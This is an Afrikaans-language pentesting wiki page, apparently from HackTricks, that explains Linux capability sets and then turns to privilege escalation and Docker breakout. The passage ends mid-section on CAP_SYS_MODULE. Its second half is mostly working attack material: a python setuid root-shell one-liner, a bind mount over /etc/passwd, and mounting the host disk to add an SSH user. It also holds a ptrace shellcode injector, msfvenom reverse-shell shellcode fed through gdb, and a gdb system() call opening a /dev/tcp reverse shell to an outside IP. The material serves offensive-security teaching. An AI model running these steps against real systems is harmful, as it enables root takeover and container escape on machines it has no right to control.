# Linux Capabilities

{{#include ../../banners/hacktricks-training.md}}


## Linux Capabilities

Linux capabilities verdeel **root-voorregte in kleiner, afsonderlike eenhede**, sodat prosesse ’n deelversameling van voorregte kan hê. Dit beperk die risiko's deur nie onnodig volle root-voorregte toe te ken nie.<sup>[[5]](#references)</sup>

### Die probleem:

- Gewone gebruikers het beperkte toestemmings, wat take soos die oopmaak van ’n network socket beïnvloed, aangesien dit root-toegang vereis.

### Capability Sets:

1. **Inherited (CapInh)**:

- **Doel**: Bepaal die capabilities wat vanaf die ouerproses oorgedra word.
- **Funksionaliteit**: Wanneer ’n nuwe proses geskep word, erf dit die capabilities van sy ouer in hierdie stel. Dit is nuttig om sekere voorregte oor proses-spawns heen te behou.
- **Beperkings**: ’n Proses kan nie capabilities verkry wat sy ouer nie besit het nie.<sup>[[3]](#references)</sup>

2. **Effective (CapEff)**:

- **Doel**: Verteenwoordig die werklike capabilities wat ’n proses op enige gegewe oomblik gebruik.
- **Funksionaliteit**: Dit is die stel capabilities wat deur die kernel nagegaan word om toestemming vir verskeie bewerkings toe te staan. Vir files kan hierdie stel ’n flag wees wat aandui of die file se permitted capabilities as effective beskou moet word.
- **Belangrikheid**: Die effective-stel is noodsaaklik vir onmiddellike voorregkontroles en tree op as die aktiewe stel capabilities wat ’n proses kan gebruik.

3. **Permitted (CapPrm)**:

- **Doel**: Definieer die maksimum stel capabilities wat ’n proses kan besit.
- **Funksionaliteit**: ’n Proses kan ’n capability van die permitted-stel na sy effective-stel verhoog, wat dit die vermoë gee om daardie capability te gebruik. Dit kan ook capabilities uit sy permitted-stel laat vaar.
- **Grens**: Dit tree op as ’n boonste beperking vir die capabilities wat ’n proses kan hê, wat verseker dat ’n proses nie sy voorafbepaalde voorregomvang oorskry nie.

4. **Bounding (CapBnd)**:

- **Doel**: Plaas ’n plafon op die capabilities wat ’n proses ooit gedurende sy lewensiklus kan verkry.
- **Funksionaliteit**: Selfs al het ’n proses ’n sekere capability in sy inheritable- of permitted-stel, kan dit daardie capability nie verkry tensy dit ook in die bounding-stel is nie.
- **Gebruik**: Hierdie stel is veral nuttig om ’n proses se potensiaal vir privilege escalation te beperk en bied ’n ekstra sekuriteitslaag.

5. **Ambient (CapAmb)**:
- **Doel**: Laat sekere capabilities toe om oor ’n `execve` system call behoue te bly, wat normaalweg ’n volledige reset van die proses se capabilities sou veroorsaak.
- **Funksionaliteit**: Verseker dat nie-SUID-programme sonder geassosieerde file capabilities sekere voorregte kan behou.
- **Beperkings**: Capabilities in hierdie stel is onderhewig aan die beperkings van die inheritable- en permitted-stelle, wat verseker dat hulle nie die proses se toegelate voorregte oorskry nie.<sup>[[8]](#references)[[9]](#references)</sup>
```python
# Code to demonstrate the interaction of different capability sets might look like this:
# Note: This is pseudo-code for illustrative purposes only.
def manage_capabilities(process):
if process.has_capability('cap_setpcap'):
process.add_capability_to_set('CapPrm', 'new_capability')
process.limit_capabilities('CapBnd')
process.preserve_capabilities_across_execve('CapAmb')
```
## Vermoëns van prosesse en binaries

### Vermoëns van prosesse

Om die vermoëns vir ’n spesifieke proses te sien, gebruik die **status**-lêer in die /proc-gids. Omdat dit meer besonderhede verskaf, beperk ons dit tot slegs die inligting wat met Linux-vermoëns verband hou.\
Let daarop dat vermoë-inligting vir alle lopende prosesse per thread onderhou word, terwyl dit vir binaries in die lêerstelsel in uitgebreide attributes gestoor word.<sup>[[4]](#references)</sup>

Jy kan die vermoëns vind wat in /usr/include/linux/capability.h gedefinieer is.

Jy kan die vermoëns van die huidige proses vind met `cat /proc/self/status` of deur `capsh --print` uit te voer, en dié van ander gebruikers in `/proc/<pid>/status`.
```bash
cat /proc/1234/status | grep Cap
cat /proc/$$/status | grep Cap #This will print the capabilities of the current process
```
Hierdie opdrag behoort op die meeste stelsels 5 reëls terug te gee.

- CapInh = Geërfde capabilities
- CapPrm = Toegelate capabilities
- CapEff = Effektiewe capabilities
- CapBnd = Begrensingsstel
- CapAmb = Ambient capabilities-stel
```bash
#These are the typical capabilities of a root owned process (all)
CapInh: 0000000000000000
CapPrm: 0000003fffffffff
CapEff: 0000003fffffffff
CapBnd: 0000003fffffffff
CapAmb: 0000000000000000
```
Hierdie heksadesimale getalle maak nie sin nie. Deur die capsh-nutsprogram te gebruik, kan ons hulle na die name van die capabilities dekodeer.
```bash
capsh --decode=0000003fffffffff
0x0000003fffffffff=cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,37
```
Kom ons kyk nou na die **capabilities** wat deur `ping` gebruik word:
```bash
cat /proc/9491/status | grep Cap
CapInh:    0000000000000000
CapPrm:    0000000000003000
CapEff:    0000000000000000
CapBnd:    0000003fffffffff
CapAmb:    0000000000000000

capsh --decode=0000000000003000
0x0000000000003000=cap_net_admin,cap_net_raw
```
Alhoewel dit werk, is daar nog ’n ander en makliker manier. Om die capabilities van ’n lopende proses te sien, gebruik eenvoudig die **getpcaps**-nutsding gevolg deur sy proses-ID (PID). Jy kan ook ’n lys van proses-ID’s verskaf.
```bash
getpcaps 1234
```
Kom ons kyk hier na die capabilities van `tcpdump` nadat die binary genoeg capabilities (`cap_net_admin` en `cap_net_raw`) gegee is om die netwerk af te luister (_tcpdump loop in proses 9562_):
```bash
#The following command give tcpdump the needed capabilities to sniff traffic
$ setcap cap_net_raw,cap_net_admin=eip /usr/sbin/tcpdump

$ getpcaps 9562
Capabilities for `9562': = cap_net_admin,cap_net_raw+ep

$ cat /proc/9562/status | grep Cap
CapInh:    0000000000000000
CapPrm:    0000000000003000
CapEff:    0000000000003000
CapBnd:    0000003fffffffff
CapAmb:    0000000000000000

$ capsh --decode=0000000000003000
0x0000000000003000=cap_net_admin,cap_net_raw
```
Soos jy kan sien, stem die gegewe vermoëns ooreen met die resultate van die 2 maniere om die vermoëns van 'n binary te verkry.\
Die _getpcaps_-tool gebruik die **capget()**-system call om die beskikbare vermoëns vir 'n spesifieke thread te bevraagteken. Hierdie system call hoef slegs die PID te verskaf om meer inligting te verkry.

### Binary-vermoëns

Binaries kan vermoëns hê wat tydens uitvoering gebruik kan word. Dit is byvoorbeeld baie algemeen om 'n `ping`-binary met die `cap_net_raw`-vermoë te vind:
```bash
getcap /usr/bin/ping
/usr/bin/ping = cap_net_raw+ep
```
Jy kan **binaries met capabilities** soek deur:
```bash
getcap -r / 2>/dev/null
```
### Verwydering van capabilities met capsh

As ons die CAP*NET_RAW-capabilities vir \_ping* verwyder, behoort die ping-nutsding nie meer te werk nie.
```bash
capsh --drop=cap_net_raw --print -- -c "tcpdump"
```
Benewens die uitvoer van _capsh_ self, behoort die _tcpdump_-opdrag self ook ’n fout te veroorsaak.

> /bin/bash: /usr/sbin/tcpdump: Operation not permitted

Die fout toon duidelik dat die ping-opdrag nie toegelaat word om ’n ICMP-socket oop te maak nie. Nou weet ons vir seker dat dit werk soos verwag.

### Verwyder Capabilities

Jy kan capabilities van ’n binary verwyder met
```bash
setcap -r </path/to/binary>
```
## User Capabilities

Apparently **dit is ook moontlik om capabilities aan users toe te ken**. Dit beteken waarskynlik dat elke proses wat deur die user uitgevoer word, die user se capabilities sal kan gebruik.\
Gebaseer op [hierdie](https://unix.stackexchange.com/questions/454708/how-do-you-add-cap-sys-admin-permissions-to-user-in-centos-7), [hierdie ](http://manpages.ubuntu.com/manpages/bionic/man5/capability.conf.5.html) en [hierdie ](https://stackoverflow.com/questions/1956732/is-it-possible-to-configure-linux-capabilities-per-user) moet ’n paar lêers gekonfigureer word om ’n user sekere capabilities te gee, maar die een wat die capabilities aan elke user toeken, sal `/etc/security/capability.conf` wees.\
Lêervoorbeeld:
```bash
# Simple
cap_sys_ptrace               developer
cap_net_raw                  user1

# Multiple capablities
cap_net_admin,cap_net_raw    jrnetadmin
# Identical, but with numeric values
12,13                        jrnetadmin

# Combining names and numerics
cap_sys_admin,22,25          jrsysadmin
```
## Omgewingsvermoëns

Deur die volgende program te compile, is dit moontlik om **'n bash-shell te spawn binne 'n omgewing wat capabilities verskaf**.
```c:ambient.c
/*
* Test program for the ambient capabilities
*
* compile using:
* gcc -Wl,--no-as-needed -lcap-ng -o ambient ambient.c
* Set effective, inherited and permitted capabilities to the compiled binary
* sudo setcap cap_setpcap,cap_net_raw,cap_net_admin,cap_sys_nice+eip ambient
*
* To get a shell with additional caps that can be inherited do:
*
* ./ambient /bin/bash
*/

#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <errno.h>
#include <sys/prctl.h>
#include <linux/capability.h>
#include <cap-ng.h>

static void set_ambient_cap(int cap) {
int rc;
capng_get_caps_process();
rc = capng_update(CAPNG_ADD, CAPNG_INHERITABLE, cap);
if (rc) {
printf("Cannot add inheritable cap\n");
exit(2);
}
capng_apply(CAPNG_SELECT_CAPS);
/* Note the two 0s at the end. Kernel checks for these */
if (prctl(PR_CAP_AMBIENT, PR_CAP_AMBIENT_RAISE, cap, 0, 0)) {
perror("Cannot set cap");
exit(1);
}
}
void usage(const char * me) {
printf("Usage: %s [-c caps] new-program new-args\n", me);
exit(1);
}
int default_caplist[] = {
CAP_NET_RAW,
CAP_NET_ADMIN,
CAP_SYS_NICE,
-1
};
int * get_caplist(const char * arg) {
int i = 1;
int * list = NULL;
char * dup = strdup(arg), * tok;
for (tok = strtok(dup, ","); tok; tok = strtok(NULL, ",")) {
list = realloc(list, (i + 1) * sizeof(int));
if (!list) {
perror("out of memory");
exit(1);
}
list[i - 1] = atoi(tok);
list[i] = -1;
i++;
}
return list;
}
int main(int argc, char ** argv) {
int rc, i, gotcaps = 0;
int * caplist = NULL;
int index = 1; // argv index for cmd to start
if (argc < 2)
usage(argv[0]);
if (strcmp(argv[1], "-c") == 0) {
if (argc <= 3) {
usage(argv[0]);
}
caplist = get_caplist(argv[2]);
index = 3;
}
if (!caplist) {
caplist = (int * ) default_caplist;
}
for (i = 0; caplist[i] != -1; i++) {
printf("adding %d to ambient list\n", caplist[i]);
set_ambient_cap(caplist[i]);
}
printf("Ambient forking shell\n");
if (execv(argv[index], argv + index))
perror("Cannot exec");
return 0;
}
```

```bash
gcc -Wl,--no-as-needed -lcap-ng -o ambient ambient.c
sudo setcap cap_setpcap,cap_net_raw,cap_net_admin,cap_sys_nice+eip ambient
./ambient /bin/bash
```
Binne die **bash wat deur die saamgestelde ambient binary uitgevoer word**, is dit moontlik om die **nuwe capabilities** waar te neem (’n gewone gebruiker sal geen capability in die "current"-afdeling hê nie).
```bash
capsh --print
Current: = cap_net_admin,cap_net_raw,cap_sys_nice+eip
```
> [!CAUTION]
> Jy kan **slegs vermoëns byvoeg wat in beide die toegelate en oorerflike stelle teenwoordig is**.

### Capability-aware/Capability-dumb binaries

Die **Capability-aware binaries sal nie die nuwe vermoëns gebruik** wat deur die omgewing gegee word nie, maar die **Capability-dumb binaries sal** dit gebruik, aangesien hulle dit nie sal verwerp nie. Dit maak Capability-dumb binaries kwesbaar binne ’n spesiale omgewing wat vermoëns aan binaries toeken.

## Service Capabilities

By verstek sal ’n **diens wat as root loop alle vermoëns toegeken hê**, en in sommige gevalle kan dit gevaarlik wees.\
Daarom laat ’n **dienskonfigurasielêer** jou toe om die **vermoëns** te **spesifiseer** wat dit moet hê, asook die **gebruiker** wat die diens moet uitvoer, om te voorkom dat ’n diens met onnodige voorregte loop:
```bash
[Service]
User=bob
AmbientCapabilities=CAP_NET_BIND_SERVICE
```
## Capabilities in Docker Containers

By verstek ken Docker 'n paar capabilities aan die containers toe. Dit is baie maklik om te kontroleer watter capabilities dit is deur die volgende uit te voer:
```bash
docker run --rm -it  r.j3ss.co/amicontained bash
Capabilities:
BOUNDING -> chown dac_override fowner fsetid kill setgid setuid setpcap net_bind_service net_raw sys_chroot mknod audit_write setfcap

# Add a capabilities
docker run --rm -it --cap-add=SYS_ADMIN r.j3ss.co/amicontained bash

# Add all capabilities
docker run --rm -it --cap-add=ALL r.j3ss.co/amicontained bash

# Remove all and add only one
docker run --rm -it  --cap-drop=ALL --cap-add=SYS_PTRACE r.j3ss.co/amicontained bash
```
## Privesc/Container Escape

Capabilities is nuttig wanneer jy **jou eie prosesse wil beperk nadat jy bevoorregte bewerkings uitgevoer het** (bv. nadat jy chroot opgestel en aan ’n socket gebind het). Dit kan egter uitgebuit word deur kwaadwillige opdragte of argumente daaraan deur te gee, wat dan as root uitgevoer word.<sup>[[2]](#references)</sup>

Jy kan capabilities op programme afdwing deur `setcap` te gebruik, en dit navraag doen met `getcap`:
```bash
#Set Capability
setcap cap_net_raw+ep /sbin/ping

#Get Capability
getcap /sbin/ping
/sbin/ping = cap_net_raw+ep
```
Die `+ep` beteken dat jy die capability as Effective en Permitted byvoeg (`-` sal dit verwyder).

Om programme in ’n stelsel of vouer met capabilities te identifiseer:
```bash
getcap -r / 2>/dev/null
```
### Exploitasievoorbeeld

In die volgende voorbeeld word gevind dat die binary `/usr/bin/python2.6` kwesbaar is vir privesc:
```bash
setcap cap_setuid+ep /usr/bin/python2.7
/usr/bin/python2.7 = cap_setuid+ep

#Exploit
/usr/bin/python2.7 -c 'import os; os.setuid(0); os.system("/bin/bash");'
```
**Capabilities** wat `tcpdump` benodig om **enige gebruiker toe te laat om pakkette te sniff**:
```bash
setcap cap_net_raw,cap_net_admin=eip /usr/sbin/tcpdump
getcap /usr/sbin/tcpdump
/usr/sbin/tcpdump = cap_net_admin,cap_net_raw+eip
```
### Die spesiale geval van "leë" capabilities

[From the docs](https://man7.org/linux/man-pages/man7/capabilities.7.html): Let daarop dat mens leë capability-stelle aan 'n programlêer kan toewys, en dit dus moontlik is om 'n set-user-ID-root-program te skep wat die effective en saved set-user-ID van die proses wat die program uitvoer na 0 verander, maar geen capabilities aan daardie proses verleen nie. Of, eenvoudig gestel, indien jy 'n binary het wat:

1. nie deur root besit word nie
2. geen `SUID`/`SGID`-bisse gestel het nie
3. 'n leë capabilities-stel het (bv.: `getcap myelf` gee `myelf =ep` terug)

dan **sal daardie binary as root loop**.

## CAP_SYS_ADMIN

**[`CAP_SYS_ADMIN`](https://man7.org/linux/man-pages/man7/capabilities.7.html)** is 'n uiters kragtige Linux capability, wat dikwels as byna-root-vlak beskou word weens sy uitgebreide **administratiewe privileges**, soos om devices te mount of kernel features te manipuleer. Hoewel dit onontbeerlik is vir containers wat volledige stelsels simuleer, **hou `CAP_SYS_ADMIN` beduidende sekuriteitsuitdagings in**, veral in containerized omgewings, weens die potensiaal daarvan vir privilege escalation en system compromise. Daarom vereis die gebruik daarvan streng security assessments en versigtige bestuur, met 'n sterk voorkeur om hierdie capability in application-specific containers te drop om aan die **beginsel van minste privilege** te voldoen en die attack surface te minimaliseer.

**Voorbeeld met binary**
```bash
getcap -r / 2>/dev/null
/usr/bin/python2.7 = cap_sys_admin+ep
```
Deur Python te gebruik, kan jy ’n gewysigde _passwd_-lêer bo-op die werklike _passwd_-lêer mount:
```bash
cp /etc/passwd ./ #Create a copy of the passwd file
openssl passwd -1 -salt abc password #Get hash of "password"
vim ./passwd #Change roots passwords of the fake passwd file
```
En laastens **mount** die gewysigde `passwd`-lêer op `/etc/passwd`:
```python
from ctypes import *
libc = CDLL("libc.so.6")
libc.mount.argtypes = (c_char_p, c_char_p, c_char_p, c_ulong, c_char_p)
MS_BIND = 4096
source = b"/path/to/fake/passwd"
target = b"/etc/passwd"
filesystemtype = b"none"
options = b"rw"
mountflags = MS_BIND
libc.mount(source, target, filesystemtype, mountflags, options)
```
En jy sal **`su` as root** kan gebruik met die wagwoord "password".

**Voorbeeld met omgewing (Docker breakout)**

Jy kan die geaktiveerde capabilities binne die Docker-houer nagaan deur:
```
capsh --print
Current: = cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read+ep
Bounding set =cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read
Securebits: 00/0x0/1'b0
secure-noroot: no (unlocked)
secure-no-suid-fixup: no (unlocked)
secure-keep-caps: no (unlocked)
uid=0(root)
gid=0(root)
groups=0(root)
```
Binne die vorige uitvoer kan jy sien dat die SYS_ADMIN capability geaktiveer is.

- **Mount**

Dit laat die docker-container toe om die host se skyf te **mount en dit vrylik te benader**:
```bash
fdisk -l #Get disk name
Disk /dev/sda: 4 GiB, 4294967296 bytes, 8388608 sectors
Units: sectors of 1 * 512 = 512 bytes
Sector size (logical/physical): 512 bytes / 512 bytes
I/O size (minimum/optimal): 512 bytes / 512 bytes

mount /dev/sda /mnt/ #Mount it
cd /mnt
chroot ./ bash #You have a shell inside the docker hosts disk
```
- **Volledige toegang**

In die vorige metode het ons daarin geslaag om toegang tot die docker host-skyf te verkry.\
Indien jy vind dat die host ’n **ssh**-bediener gebruik, kan jy **’n gebruiker binne die docker host**-skyf skep en toegang daartoe via SSH verkry:
```bash
#Like in the example before, the first step is to mount the docker host disk
fdisk -l
mount /dev/sda /mnt/

#Then, search for open ports inside the docker host
nc -v -n -w2 -z 172.17.0.1 1-65535
(UNKNOWN) [172.17.0.1] 2222 (?) open

#Finally, create a new user inside the docker host and use it to access via SSH
chroot /mnt/ adduser john
ssh john@172.17.0.1 -p 2222
```
## CAP_SYS_PTRACE

**Dit beteken dat jy uit die container kan ontsnap deur shellcode binne 'n process wat binne die host loop, in te spuit.** Om toegang te kry tot processes wat binne die host loop, moet die container ten minste met **`--pid=host`** laat loop word.

**[`CAP_SYS_PTRACE`](https://man7.org/linux/man-pages/man7/capabilities.7.html)** verleen die vermoë om debugging- en system call tracing-funksionaliteit te gebruik wat deur `ptrace(2)` verskaf word, asook cross-memory attach calls soos `process_vm_readv(2)` en `process_vm_writev(2)`. Hoewel dit kragtig is vir diagnostiese en moniteringsdoeleindes, kan dit die stelselsekuriteit aansienlik ondermyn indien `CAP_SYS_PTRACE` geaktiveer is sonder beperkende maatreëls soos 'n seccomp-filter op `ptrace(2)`. Dit kan spesifiek uitgebuit word om ander sekuriteitsbeperkings te omseil, veral dié wat deur seccomp opgelê word, soos gedemonstreer deur [proofs of concept (PoC) soos hierdie een](https://gist.github.com/thejh/8346f47e359adecd1d53).<sup>[[10]](#references)</sup>

**Voorbeeld met binary (python)**
```bash
getcap -r / 2>/dev/null
/usr/bin/python2.7 = cap_sys_ptrace+ep
```

```python
import ctypes
import sys
import struct
# Macros defined in <sys/ptrace.h>
# https://code.woboq.org/qt5/include/sys/ptrace.h.html
PTRACE_POKETEXT = 4
PTRACE_GETREGS = 12
PTRACE_SETREGS = 13
PTRACE_ATTACH = 16
PTRACE_DETACH = 17
# Structure defined in <sys/user.h>
# https://code.woboq.org/qt5/include/sys/user.h.html#user_regs_struct
class user_regs_struct(ctypes.Structure):
_fields_ = [
("r15", ctypes.c_ulonglong),
("r14", ctypes.c_ulonglong),
("r13", ctypes.c_ulonglong),
("r12", ctypes.c_ulonglong),
("rbp", ctypes.c_ulonglong),
("rbx", ctypes.c_ulonglong),
("r11", ctypes.c_ulonglong),
("r10", ctypes.c_ulonglong),
("r9", ctypes.c_ulonglong),
("r8", ctypes.c_ulonglong),
("rax", ctypes.c_ulonglong),
("rcx", ctypes.c_ulonglong),
("rdx", ctypes.c_ulonglong),
("rsi", ctypes.c_ulonglong),
("rdi", ctypes.c_ulonglong),
("orig_rax", ctypes.c_ulonglong),
("rip", ctypes.c_ulonglong),
("cs", ctypes.c_ulonglong),
("eflags", ctypes.c_ulonglong),
("rsp", ctypes.c_ulonglong),
("ss", ctypes.c_ulonglong),
("fs_base", ctypes.c_ulonglong),
("gs_base", ctypes.c_ulonglong),
("ds", ctypes.c_ulonglong),
("es", ctypes.c_ulonglong),
("fs", ctypes.c_ulonglong),
("gs", ctypes.c_ulonglong),
]

libc = ctypes.CDLL("libc.so.6")

pid=int(sys.argv[1])

# Define argument type and respone type.
libc.ptrace.argtypes = [ctypes.c_uint64, ctypes.c_uint64, ctypes.c_void_p, ctypes.c_void_p]
libc.ptrace.restype = ctypes.c_uint64

# Attach to the process
libc.ptrace(PTRACE_ATTACH, pid, None, None)
registers=user_regs_struct()

# Retrieve the value stored in registers
libc.ptrace(PTRACE_GETREGS, pid, None, ctypes.byref(registers))
print("Instruction Pointer: " + hex(registers.rip))
print("Injecting Shellcode at: " + hex(registers.rip))

# Shell code copied from exploit db. https://github.com/0x00pf/0x00sec_code/blob/master/mem_inject/infect.c
shellcode = "\x48\x31\xc0\x48\x31\xd2\x48\x31\xf6\xff\xc6\x6a\x29\x58\x6a\x02\x5f\x0f\x05\x48\x97\x6a\x02\x66\xc7\x44\x24\x02\x15\xe0\x54\x5e\x52\x6a\x31\x58\x6a\x10\x5a\x0f\x05\x5e\x6a\x32\x58\x0f\x05\x6a\x2b\x58\x0f\x05\x48\x97\x6a\x03\x5e\xff\xce\xb0\x21\x0f\x05\x75\xf8\xf7\xe6\x52\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x48\x8d\x3c\x24\xb0\x3b\x0f\x05"

# Inject the shellcode into the running process byte by byte.
for i in xrange(0,len(shellcode),4):
# Convert the byte to little endian.
shellcode_byte_int=int(shellcode[i:4+i].encode('hex'),16)
shellcode_byte_little_endian=struct.pack("<I", shellcode_byte_int).rstrip('\x00').encode('hex')
shellcode_byte=int(shellcode_byte_little_endian,16)

# Inject the byte.
libc.ptrace(PTRACE_POKETEXT, pid, ctypes.c_void_p(registers.rip+i),shellcode_byte)

print("Shellcode Injected!!")

# Modify the instuction pointer
registers.rip=registers.rip+2

# Set the registers
libc.ptrace(PTRACE_SETREGS, pid, None, ctypes.byref(registers))
print("Final Instruction Pointer: " + hex(registers.rip))

# Detach from the process.
libc.ptrace(PTRACE_DETACH, pid, None, None)
```
**Voorbeeld met binary (gdb)**

`gdb` met `ptrace`-vermoë:
```
/usr/bin/gdb = cap_sys_ptrace+ep
```
Skep shellcode met msfvenom om dit via gdb in memory te injecteer
```python
# msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.11 LPORT=9001 -f py -o revshell.py
buf =  b""
buf += b"\x6a\x29\x58\x99\x6a\x02\x5f\x6a\x01\x5e\x0f\x05"
buf += b"\x48\x97\x48\xb9\x02\x00\x23\x29\x0a\x0a\x0e\x0b"
buf += b"\x51\x48\x89\xe6\x6a\x10\x5a\x6a\x2a\x58\x0f\x05"
buf += b"\x6a\x03\x5e\x48\xff\xce\x6a\x21\x58\x0f\x05\x75"
buf += b"\xf6\x6a\x3b\x58\x99\x48\xbb\x2f\x62\x69\x6e\x2f"
buf += b"\x73\x68\x00\x53\x48\x89\xe7\x52\x57\x48\x89\xe6"
buf += b"\x0f\x05"

# Divisible by 8
payload = b"\x90" * (-len(buf) % 8) + buf

# Change endianess and print gdb lines to load the shellcode in RIP directly
for i in range(0, len(buf), 8):
chunk = payload[i:i+8][::-1]
chunks = "0x"
for byte in chunk:
chunks += f"{byte:02x}"

print(f"set {{long}}($rip+{i}) = {chunks}")
```
Debug 'n root-proses met gdb en copy-paste die voorheen gegenereerde gdb-reëls:
```bash
# Let's write the commands to a file
echo 'set {long}($rip+0) = 0x296a909090909090
set {long}($rip+8) = 0x5e016a5f026a9958
set {long}($rip+16) = 0x0002b9489748050f
set {long}($rip+24) = 0x48510b0e0a0a2923
set {long}($rip+32) = 0x582a6a5a106ae689
set {long}($rip+40) = 0xceff485e036a050f
set {long}($rip+48) = 0x6af675050f58216a
set {long}($rip+56) = 0x69622fbb4899583b
set {long}($rip+64) = 0x8948530068732f6e
set {long}($rip+72) = 0x050fe689485752e7
c' > commands.gdb
# In this case there was a sleep run by root
## NOTE that the process you abuse will die after the shellcode
/usr/bin/gdb -p $(pgrep sleep)
[...]
(gdb) source commands.gdb
Continuing.
process 207009 is executing new program: /usr/bin/dash
[...]
```
**Example met environment (Docker breakout) - Another gdb Abuse**

Indien **GDB** geïnstalleer is (of jy dit byvoorbeeld met `apk add gdb` of `apt install gdb` kan installeer), kan jy **'n process vanaf die host debug** en dit die `system`-function laat aanroep. (Hierdie technique vereis ook die capability `SYS_ADMIN`)**.**
```bash
gdb -p 1234
(gdb) call (void)system("ls")
(gdb) call (void)system("sleep 5")
(gdb) call (void)system("bash -c 'bash -i >& /dev/tcp/192.168.115.135/5656 0>&1'")
```
Jy sal nie die uitvoer van die opdrag wat uitgevoer is kan sien nie, maar dit sal deur daardie proses uitgevoer word (kry dus ’n rev shell).

> [!WARNING]
> As jy die fout "No symbol "system" in current context." kry, kyk na die vorige voorbeeld waar ’n shellcode in ’n program via gdb gelaai word.

**Example with environment (Docker breakout) - Shellcode Injection**

Jy kan die geaktiveerde capabilities binne die docker-container nagaan met:
```bash
capsh --print
Current: = cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_sys_ptrace,cap_mknod,cap_audit_write,cap_setfcap+ep
Bounding set =cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_sys_ptrace,cap_mknod,cap_audit_write,cap_setfcap
Securebits: 00/0x0/1'b0
secure-noroot: no (unlocked)
secure-no-suid-fixup: no (unlocked)
secure-keep-caps: no (unlocked)
uid=0(root)
gid=0(root)
groups=0(root
```
Lys **prosesse** wat in die **host** loop `ps -eaf`

1. Kry die **argitektuur** `uname -m`
2. Vind **shellcode** vir die argitektuur ([https://www.exploit-db.com/exploits/41128](https://www.exploit-db.com/exploits/41128))
3. Vind ’n **program** om die **shellcode** in ’n proses se geheue te **inject** ([https://github.com/0x00pf/0x00sec_code/blob/master/mem_inject/infect.c](https://github.com/0x00pf/0x00sec_code/blob/master/mem_inject/infect.c))
4. **Modify** die **shellcode** binne die program en **compile** dit `gcc inject.c -o inject`
5. **Inject** dit en kry jou **shell**: `./inject 299; nc 172.17.0.1 5600`

## CAP_SYS_MODULE

**[`CAP_SYS_MODULE`](https://man7.org/linux/man-pages/man7/capabilities.7.html)** stel ’n proses in staat om kernel modules te **load** en **unload** (`init_module(2)`, `finit_module(2)` en `delete_module(2)` system calls), wat direkte toegang tot die kernel se kernbewerkings bied. Hierdie capability hou kritieke sekuriteitsrisiko’s in, aangesien dit privilege escalation en volledige stelselkompromittering moontlik maak deur wysigings aan die kernel toe te laat en sodoende alle Linux-sekuriteitsmeganismes, insluitend Linux Security Modules en container-isolasie, te omseil.<sup>[[6]](#references)</sup>
**Dit beteken dat jy** kernel modules in en uit die kernel van die host-masjien kan **insert** en **remove**.

**Voorbeeld met binary**

In die volgende voorbeeld het die binary **`python`** hierdie capability.
```bash
getcap -r / 2>/dev/null
/usr/bin/python2.7 = cap_sys_module+ep
```
By verstek kontroleer die **`modprobe`**-opdrag vir afhanklikheidslyste en kaartlêers in die gids **`/lib/modules/$(uname -r)`**.\
Om dit te misbruik, skep ons ’n vals **lib/modules**-gids:
```bash
mkdir lib/modules -p
cp -a /lib/modules/5.0.0-20-generic/ lib/modules/$(uname -r)
```
Kompileer dan **die kernel module wat jy hieronder in 2 voorbeelde kan vind, en kopieer** dit na hierdie vouer:
```bash
cp reverse-shell.ko lib/modules/$(uname -r)/
```
Laastens, voer die nodige Python-kode uit om hierdie kernmodule te laai:
```python
import kmod
km = kmod.Kmod()
km.set_mod_dir("/path/to/fake/lib/modules/5.0.0-20-generic/")
km.modprobe("reverse-shell")
```
**Voorbeeld 2 met binary**

In die volgende voorbeeld het die binary **`kmod`** hierdie capability.
```bash
getcap -r / 2>/dev/null
/bin/kmod = cap_sys_module+ep
```
Wat beteken dat dit moontlik is om die opdrag **`insmod`** te gebruik om 'n kernel module in te voeg. Volg die voorbeeld hieronder om 'n **reverse shell** te verkry deur hierdie privilege te misbruik.

**Voorbeeld met environment (Docker breakout)**

Jy kan die geaktiveerde capabilities binne die Docker container nagaan met:
```bash
capsh --print
Current: = cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_module,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap+ep
